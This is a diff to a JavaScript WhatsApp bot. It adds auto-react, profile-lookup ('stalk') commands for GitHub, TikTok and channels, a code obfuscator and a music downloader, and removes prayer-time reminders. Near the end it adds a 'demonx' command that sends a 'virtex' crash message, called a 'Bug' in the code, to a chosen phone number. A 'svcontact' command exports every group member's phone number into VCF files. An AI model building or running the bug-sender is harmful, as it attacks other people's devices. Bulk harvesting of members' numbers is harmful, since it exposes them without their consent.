@@ -241,11 +241,6 @@ const {
     vnKawai,
     vnLove
 } = require('../temp/audio/autovn.js')
-const {
-    stikOtw,
-    stikSpam,
-    stikAdmin
-} = require('../temp/sticker/autosticker.js')
 // VIRTEX BUKAN BUG
 const {
     virtex,
@@ -355,9 +350,15 @@ module.exports = async (conn, dev, chatUpdate, store) => {
         //const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
         const replyCommand = isCmd ? isCmd : allcommand.includes(toFirstCase(command))
         const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
-
-
-
+const isMessage = m.message.conversation || 
+                m.message.extendedTextMessage?.text || 
+                m.message.imageMessage?.caption || 
+                m.message.videoMessage?.caption || 
+                m.message.documentMessage?.caption || 
+                m.message.buttonsResponseMessage?.selectedButtonId || 
+                m.message.templateButtonReplyMessage?.selectedId || 
+                m.message.listResponseMessage?.singleSelectReply?.selectedRowId || 
+                '';
         const user = global.db.data.users[m.sender]
         const chat = isGroup ? global.db.data.chats[m.chat] : false
         const isSimi = isGroup ? siminya.includes(m.chat) : false
@@ -446,12 +447,12 @@ module.exports = async (conn, dev, chatUpdate, store) => {
                         thumbnailUrl: anu,
                     },
                 };
-                let teks = `*]───── REGISTERED ─────[*
+                let teks = `  *❯❯ ＢＬＵＥ ＤＥＭＯＮ ❮❮*
  
-👤 Name: ${pushname}
-☎️ Number: ${senderNumber}
-📡 Serial: ${db.data.users[m.sender].serial}
-📍 Verified: ${calender}
+*👤 Name: ${pushname}*
+*☎️ Number: ${senderNumber}*
+*📡 Serial: ${db.data.users[m.sender].serial}*
+*📍 Verified: ${calender}*
  `
                 await sleep(1000)
                 conn.sendMessage(m.chat, {
@@ -748,15 +749,6 @@ module.exports = async (conn, dev, chatUpdate, store) => {
         //VN kawai
         const olah = vnKawai
         const kawai = olah[Math.floor(Math.random() * olah.length)]
-        // RESPON STIKER 
-        //blueimages otw
-        const onde = stikOtw
-        const otw =
-            onde[Math.floor(Math.random() * onde.length)]
-        //blueimages spam
-        const spamm = stikSpam
-        const spamni =
-            spamm[Math.floor(Math.random() * spamm.length)]
         //respon teks
         let listRespon = global.db.data.respon[body]
         if (listRespon) m.reply(listRespon.respon)
@@ -1056,7 +1048,7 @@ module.exports = async (conn, dev, chatUpdate, store) => {
                 url: pickRandom(fotoRandom),
                 type: "image/jpeg"
             }
-            let url = `https://www.youtube.com/@rangelbot`
+            let url = `https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h`
 
             let contextInfo = {
                 externalAdReply: {
@@ -1078,53 +1070,8 @@ module.exports = async (conn, dev, chatUpdate, store) => {
                 quoted: m
             })
         }
-        // AUTO SHOLAT 
-        conn.autoshalat = conn.autoshalat ? conn.autoshalat : {}
-        let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.id : m.sender
-        let id = m.chat
-        if (id in conn.autoshalat) {
-            return false
-        }
-        let jadwalSholat = {
-            shubuh: '04:29',
-            terbit: '05:44',
-            dhuha: '06:02',
-            dzuhur: '12:02',
-            ashar: '15:15',
-            magrib: '17:52',
-            isya: '19:01',
-        }
-        const datek = new Date((new Date).toLocaleString("en-US", {
-            timeZone: "Africa/Lagos"
-        }));
-        const hours = datek.getHours();
-        const minutes = datek.getMinutes();
-        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
-        for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
-            if (timeNow === waktu) {
-                let caption = Ehztext(`Hi ${pushname},\nThe time for *${prayer}* has arrived, take ablution water and pray immediately🙂.\n\n*${time}*\n_for the Makassar area and surrounding areas._`)
-                conn.autoshalat[id] = [
-                    setReply(caption),
-                    setTimeout(async () => {
-                        delete conn.autoshalat[m.chat]
-                    }, 57000)
-                ]
-            }
-        }
         // publik & Self And Banchat
-        if (!publik && !itsMe && !isOwner && !theOwner) return
-        if (isGroup && isBanchat) {
-            if (!itsMe && !isOwner) return
-        }
-        // Mute Chat grub
-        if (isGroup) {
-            let mut = db.data.chats[m.chat].mute
-            if (mut && !isGroupAdmins && !isOwner && !isGroupOwner) {
-                return
-            }
-        }
-
-
+if (!publik && !isOwner) return; // Ignore non-owner commands in self mode
 
         const pickRandom = (arr) => {
             return arr[Math.floor(Math.random() * arr.length)]
@@ -1577,7 +1524,37 @@ Maaf kak @${sender.split('@')[0]} limit kamu sudah habis!`
                 quoted: fkontak
             })
         }
+// This case was invented by BLUE DEMON
+if (global.autoreact && isMessage) {
+    try {
+        // Define an array of emojis
+        const emojis = [
+            "😊", "👍", "😂", "🥶", "😵", 
+            "😘", "😑", "🐥", "💱", "🤤", 
+            "😼", "🙄", "☹️", "😲", "🤢", 
+            "🥵", "😤"
+        ];
 
+        // Function to pick a random emoji
+        const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];
+
+        // Ensure the message has a valid key before sending a reaction
+        if (m.key && m.key.remoteJid && m.key.id) {
+            const randomEmoji = getRandomEmoji();
+
+            // Send the reaction
+            await conn.sendMessage(m.chat, {
+                react: {
+                    text: randomEmoji,
+                    key: m.key
+                }
+            });
+        }
+    } catch (error) {
+        // Handle errors and log them for debugging
+        console.error("Error in AutoReact:", error.message || error);
+    }
+}
         const onlyGlimit = async () => {
             //let image = fs.readFileSync("stik/bot.jpg") // Sementara tar gw ganti image nya
             let kyahh = `*乂 Limit - Expired*
@@ -1820,12 +1797,12 @@ dan juga sudah di tandai sebagai user biadap`
         //ANTI LINK 
         if (isGroup && isAntiLink) {
             if (budy.includes(`https:`)) {
-                if (isGroupAdmins) return setReply(`${themeemoji}*「 LINK DETECTED 」*${themeemoji}\n*GROUP ADMINS ARE EXCEPTIONAL*`)
-                if (ownerNumber.includes(sender)) return setReply(`${themeemoji}*「 LINK DETECTED  」*${themeemoji}`)
+                if (isGroupAdmins) return setReply(`*「 LINK DETECTED 」*\n> *GROUP ADMINS ARE EXCEPTIONAL*`)
+                if (ownerNumber.includes(sender)) return setReply(`*「 LINK DETECTED  」*`)
                 let linkgc = await conn.groupInviteCode(from)
-                if (budy.includes(`${linkgc}`)) return reply(`${themeemoji}*「 GROUP LINK DETECTED  」*${themeemoji}`)
-                if (budy.includes('zin admin') || budy.includes('zinmin')) return setReply('Izin Admin diterima')
-                setReply(` *「 LINK DETECTED 」*\`You sent a link, sorry you were kicked from the group`)
+                if (budy.includes(`${linkgc}`)) return reply(`*「 GROUP LINK DETECTED  」*\n> *Almost kicked you ✌️*`)
+                if (budy.includes('blue') || budy.includes('admin')) return reply('*「 GROUP LINK DETECTED  」*\nADMIN PERMISSION RECEIVED')
+                setReply(` *「 LINK DETECTED 」*\n> You sent a link, sorry you were kicked from the group`)
                 setTimeout(() => {
                     if (isBotGroupAdmins) conn.sendMessage(from, {
                         delete: m.key
@@ -2610,7 +2587,7 @@ ${isWin ? `@${winner.split('@')[0]} *MENANG!*` : isTie ? `*HASIL SERI*` : `Gilir
                 break
                case 'tagall': {
     if (!isGroup) return setReply(mess.only.group);
-    if (!isGroupAdmins && !isOwner) return reply(mess.only.admin);
+    if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin);
 
     try {
         // Notify that tagging is in progress
@@ -2850,7 +2827,7 @@ if (!isOwner) return setReply(mess.only.owner)
                 case 'runtime': {
                     let data = global.db.data.others['runtime']
                     let time = (new Date - data.runtime) || 'long time'
-                    setReply(`${themeemoji} *BOT HAS BEEN RUNNING FOR ${runtime(process.uptime())}*`)
+                    setReply(`${themeemoji} \`RUNTIME\` ${themeemoji}\n*${runtime(process.uptime())}*`)
                 }
                 break
                 case 'kick': {
@@ -3920,46 +3897,39 @@ case 'songs': {
     if (!text) return reply(`\`No music title detected.\`\n*Example: ${prefix + command} Alan Walker - Faded*`);
 
     try {
-        await loading()
+        await loading();
 
         // Search for the video using the text provided
         let search = await yts(text);
         let video = search.videos[0];
         if (!video) return reply("No results found for the provided query.");
 
-        let { title, thumbnail, url } = video;
+        let { title, timestamp, views, ago, url, thumbnail } = video;
 
-        // Inform the user that the download is starting
-        reply(`🎶 *Found:* ${title}\n${botName}\nDownloading your audio now...`);
+        // Send the thumbnail with the video details as caption
+        await conn.sendMessage(m.chat, {
+            image: { url: thumbnail },  // Send the thumbnail image
+            caption: `🎶 *Title:* ${title}\n👁️ *Views:* ${views}\n⏱️ *Duration:* ${timestamp}\n📅 *Uploaded:* ${ago}\n🌐 *URL:* ${url}\n\n> ${botName}`,
+        });
 
         // Fetch audio details from the new API
-        let apiUrl = `https://api.giftedtech.my.id/api/download/ytplay?apikey=gifted&url=${encodeURIComponent(url)}`;
-        let res = fetch(apiUrl); // Fetch audio data asynchronously
-        let json = await (await res).json(); // Parse JSON
+        let apiUrl = `https://api-lenwy.vercel.app/mp3?url=${encodeURIComponent(url)}`;
+        let res = await fetch(apiUrl);
+        let json = await res.json();
 
         // Validate API response
-        if (json.status !== 200 || !json.success) {
+        if (json.status !== 200 || !json.data) {
             return reply("Failed to fetch audio. Please try again later.");
         }
 
-        let audioUrl = json.result.audio[0]?.download_url;
+        let audioUrl = json.data.download_url;
         if (!audioUrl) return reply("Audio URL not found in the API response.");
 
-        // Prepare and send the audio file
-        conn.sendMessage(m.chat, {
+        // Send only the audio file
+        await conn.sendMessage(m.chat, {
             audio: { url: audioUrl },
             mimetype: "audio/mp4",
-            fileName: `${json.result.title}.mp3`,
-            contextInfo: {
-                externalAdReply: {
-                    title: json.result.title,
-                    body: "Music Downloaded",
-                    thumbnailUrl: json.result.thumbnail,
-                    mediaUrl: url,
-                    mediaType: 2,
-                    renderLargerThumbnail: true,
-                },
-            },
+            fileName: `${json.data.title}.mp3`,
         }, { quoted: m });
 
     } catch (error) {
@@ -4254,37 +4224,275 @@ case 'hrt':
                 setTimeout(() => updateMessage(), 1000);
                 break;
             }
-case 'smimg':
-case 'setmenuimg': {
-    if (!isOwner) return setReply(mess.only.owner);
-    if (m.quoted && m.quoted.mtype === 'imageMessage' || m.mtype === 'imageMessage') {
-        try {
-            let media = m.quoted ? m.quoted : m;
-            let savedPath = `./database/blueimages/thumb.jpg`;
+case 'gitstalk': {
+    if (!text) return reply(`\`Please provide a GitHub username.\`\n*Example:* ${prefix + command} BLUEXDEMONl`);
 
-            let buffer = await conn.downloadMediaMessage(media);
-            if (!buffer) return reply("Failed to download the image. Please try again.");
+    await loading();
 
-            await fse.writeFile(savedPath, buffer);
-            reply("`SUCCESSFULLY CHANGED THE THUMB IMAGE`");
-        } catch (error) {
-            console.error("Error in setmenuimg case:", error);
-            reply("An error occurred while processing your request. Please try again later.");
+    try {
+        const apiUrl = `https://api.giftedtech.my.id/api/stalk/gitstalk?apikey=gifted&username=${encodeURIComponent(text)}`;
+        const response = await fetch(apiUrl);
+        const json = await response.json();
+
+        if (json.status !== 200 || !json.success) {
+            return reply("Failed to fetch GitHub details. Please check the username and try again.");
         }
-    } else {
-        reply(`\`No image detected.\`\n*Please reply to an image to set it as the menu thumbnail.*`);
+
+        const {
+            login, avatar_url, html_url, name, company, location, bio,
+            public_repos, followers, following, created_at, updated_at
+        } = json.result;
+
+        const message = `*GitHub User Details*\n\n` +
+            `👤 *Name:* ${name || 'N/A'}\n` +
+            `📂 *Username:* ${login}\n` +
+            `🏢 *Company:* ${company || 'N/A'}\n` +
+            `📍 *Location:* ${location || 'N/A'}\n` +
+            `📝 *Bio:* ${bio || 'N/A'}\n\n` +
+            `🔗 *Profile URL:* ${html_url}\n` +
+            `📦 *Public Repos:* ${public_repos}\n` +
+            `👥 *Followers:* ${followers}\n` +
+            `➡️ *Following:* ${following}\n\n` +
+            `📅 *Account Created:* ${new Date(created_at).toDateString()}\n` +
+            `🕒 *Last Updated:* ${new Date(updated_at).toDateString()}\n> ${botName}`;
+
+        await conn.sendMessage(from, {
+            image: { url: avatar_url },
+            caption: message,
+        }, { quoted: m });
+    } catch (error) {
+        console.error("Error in gitstalk case:", error);
+        reply("An error occurred while processing your request. Please try again later.");
     }
     break;
 }
+case 'wachannel': {
+    if (!text) return reply(`\`Please provide a WhatsApp Channel link.\`\n*Example:* ${prefix + command} https://whatsapp.com/channel/..`);
 
+    await loading();
 
+    try {
+        const apiUrl = `https://api.giftedtech.my.id/api/stalk/wachannel?apikey=gifted&url=${encodeURIComponent(text)}`;
+        const response = await fetch(apiUrl);
+        const json = await response.json();
 
+        if (json.status !== 200 || !json.success) {
+            return reply("Failed to fetch channel details. Please check the URL and try again.");
+        }
 
+        const { img, title, followers, description } = json.result;
 
+        const message = `*WhatsApp Channel Details*\n\n` +
+            `📌 *Title:* ${title}\n` +
+            `👥 *Followers:* ${followers}\n\n` +
+            `📄 *Description:*\n${description}`;
 
+        await conn.sendMessage(from, {
+            image: { url: img },
+            caption: message,
+        }, { quoted: m });
+    } catch (error) {
+        console.error("Error in wachannel case:", error);
+        reply("An error occurred while processing your request. Please try again later.");
+    }
+    break;
+}
+case 'tiktokstalk': {
+    if (!text) return reply(`\`Please provide a TikTok username.\`\n*Example:* ${prefix + command} giftedtechke`);
 
+    await loading();
 
+    try {
+        const apiUrl = `https://api.giftedtech.my.id/api/stalk/tiktokstalk?apikey=gifted&username=${encodeURIComponent(text)}`;
+        const response = await fetch(apiUrl);
+        const json = await response.json();
 
+        if (!json.success || !json.result) {
+            return reply("Failed to fetch TikTok user details. Please check the username and try again.");
+        }
+
+        const user = json.result.user;
+        const stats = json.result.stats;
+
+        const message = `*🎥 TikTok User Information*\n\n` +
+            `👤 *Username:* ${user.uniqueId}\n` +
+            `🎭 *Nickname:* ${user.nickname}\n` +
+            `🌎 *Region:* ${user.region || "Unknown"}\n` +
+            `✅ *Verified:* ${user.verified ? "Yes" : "No"}\n\n` +
+            `📄 *Bio:* ${user.signature || "No bio available"}\n` +
+            `🔗 *Profile Link:* [Visit Profile](https://www.tiktok.com/@${user.uniqueId})\n\n` +
+            `📊 *Statistics:*\n` +
+            `👥 *Followers:* ${stats.followerCount || 0}\n` +
+            `🔗 *Following:* ${stats.followingCount || 0}\n` +
+            `❤️ *Likes:* ${stats.heartCount || 0}\n` +
+            `🎥 *Videos:* ${stats.videoCount || 0}`;
+
+        await conn.sendMessage(from, {
+            image: { url: user.avatarLarger },
+            caption: message,
+        }, { quoted: m });
+
+    } catch (error) {
+        console.error("Error in tiktokstalk case:", error);
+        reply("An error occurred while processing your request. Please try again later.");
+    }
+    break;
+}
+case 'obfuscate': {
+    if (!text) return reply(`Please provide JavaScript code to obfuscate.\n\n*Example:* ${prefix + command} console.log('blue demon');`);
+    
+    await loading();
+
+    try {
+        const apiUrl = `https://api.giftedtech.my.id/api/tools/encrypt?apikey=gifted&code=${encodeURIComponent(text)}`;
+        
+        // Fetch API response
+        const response = await fetch(apiUrl);
+
+        // Check for HTTP errors
+        if (!response.ok) {
+            console.error(`API returned status: ${response.status} ${response.statusText}`);
+            return reply("Failed to connect to the obfuscation service. Please try again later.");
+        }
+
+        const res = await response.json();
+
+        // Validate API response
+        if (res.status !== 200 || !res.success) {
+            console.error(`API error: ${JSON.stringify(res)}`);
+            return reply("Failed to obfuscate the provided code. Please ensure the code is valid and try again.");
+        }
+
+        const encryptedCode = res.encrypted_code;
+
+        // Send the obfuscated code with the image
+        await conn.sendMessage(m.chat, {
+            image: { url: './database/blueimages/obfuscate.jpg' }, // Image path
+            caption: `*🔒 Obfuscated Code:*\n\n${readmore}\`\`\`${encryptedCode}\`\`\`\n> ${botName}`,
+        }, { quoted: m });
+
+    } catch (error) {
+        console.error("Error in obfuscate case:", error.message || error);
+        reply("An error occurred while processing your request. Please try again later.");
+    }
+    break;
+}
+case 'svcontact': {
+    if (!isGroup) return setReply(mess.only.group);
+    if (!isAdmins) return setReply(mess.only.admins)
+    await loading();
+
+    try {
+        const groupMetadata = await conn.groupMetadata(m.chat);
+        const participants = groupMetadata.participants;
+        const groupName = groupMetadata.subject; // Group name
+        const totalContacts = participants.length; // Total number of contacts
+        const vcfFiles = [];
+        let vcfData = '';
+        let fileCounter = 1;
+        let contactCounter = 0;
+
+        for (let participant of participants) {
+            const contactNumber = participant.id.split('@')[0];
+            const contactName = participant.notify || participant.id.split('@')[0];
+            vcfData += `BEGIN:VCARD\nVERSION:3.0\nFN:${contactName}\nTEL;type=CELL;type=VOICE;waid=${contactNumber}:${contactNumber}\nEND:VCARD\n\n`;
+            contactCounter++;
+
+            if (contactCounter % 100 === 0 || participant === participants[participants.length - 1]) {
+                // Save the VCF data to a file
+                const vcfFileName = `./temp/contacts_file_${fileCounter}.vcf`;
+                fs.writeFileSync(vcfFileName, vcfData, 'utf8');
+                vcfFiles.push(vcfFileName);
+                vcfData = ''; // Reset for the next file
+                fileCounter++;
+            }
+        }
+
+        // Send each VCF file
+        for (let i = 0; i < vcfFiles.length; i++) {
+            const vcfFileName = vcfFiles[i];
+            const caption = `*Contact file ${i + 1}*\n\n*GROUP:* ${groupName}\n*CONTACTS:* ${totalContacts}\n> ${botName}`;
+            await conn.sendMessage(m.chat, { document: { url: vcfFileName }, fileName: `contacts_file_${i + 1}.vcf`, mimetype: 'text/x-vcard', caption }, { quoted: m });
+            fs.unlinkSync(vcfFileName); // Delete the file after sending
+        }
+    } catch (error) {
+        console.error("Error in svcontact case:", error.message || error);
+        reply("An error occurred while processing the contacts. Please try again later.");
+    }
+    break;
+}
+case 'fancy': {
+    if (!text) return reply(`Please provide the text to stylize.\n\n*Example:* ${prefix + command} Gifted Tech`);
+    
+    await loading();
+
+    try {
+        const apiUrl = `https://api.giftedtech.my.id/api/tools/fancy?apikey=gifted&text=${encodeURIComponent(text)}`;
+        const response = await fetch(apiUrl);
+
+        // Check for HTTP errors
+        if (!response.ok) {
+            console.error(`API returned status: ${response.status} ${response.statusText}`);
+            return reply("Failed to connect to the fancy text service. Please try again later.");
+        }
+
+        const res = await response.json();
+
+        // Validate API response
+        if (res.status !== 200 || !res.success || !res.results || res.results.length === 0) {
+            return reply("Failed to generate fancy text. Please try again later.");
+        }
+
+        // Format the stylized text results
+        const styles = res.results
+            .filter(item => item.result.trim()) // Filter out empty results
+            .map((item, index) => `${themeemoji}. ${item.result}`)
+            .join('\n\n');
+
+        // Send the formatted response
+        await conn.sendMessage(m.chat, {
+            image: { url: './database/blueimages/fancy.jpg' },
+            caption: `*Fancy Text Generator:*\n${readmore}\n${styles}\n\n> ${botName}`,
+        }, { quoted: m });
+    } catch (error) {
+        console.error("Error in fancy case:", error.message || error);
+        reply("An error occurred while processing your request. Please try again later.");
+    }
+    break;
+}
+case 'areact': {
+    if (!isOwner) return setReply(mess.only.owner); // Check if the user is the owner
+    
+    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided
+    
+    if (args[0] === 'on') {
+        global.autoreact = true; // Enable auto react
+        await reply('`Successfully Activated AutoReact.`');
+    } else if (args[0] === 'off') {
+        global.autoreact = false; // Disable auto react
+        await reply('`Successfully Deactivated AutoReact.`');
+    } else {
+        return reply(`\`Invalid option. Use "on" or "off" to toggle AutoReact.\``);
+    }
+    break;
+}
+case  'demonx':
+try{
+if(!isOwner) return setReply(mess.only.owner)
+let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
+console.log(Pe)
+if(!Pe ) return reply("Enter target number")
+if(Pe == Ownerin) return setReply("SendBug Failed")
+await setReply("Sending...")
+await conn.sendKatalog(Pe, virtex8(prefix), virtex8(prefix), thumb, {quoted: fcall})
+let a = await conn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
+conn.sendMessage(Pe, { text: "𝐁.𝐃" }, { quoted: a });
+reply(`Successfully sent Bug to Number ${Pe.split("@")[0]}`)
+} catch (err){
+console.log(err)
+reply("Failed to submit bug, Error Occurred")
+}
+break
 
 
 
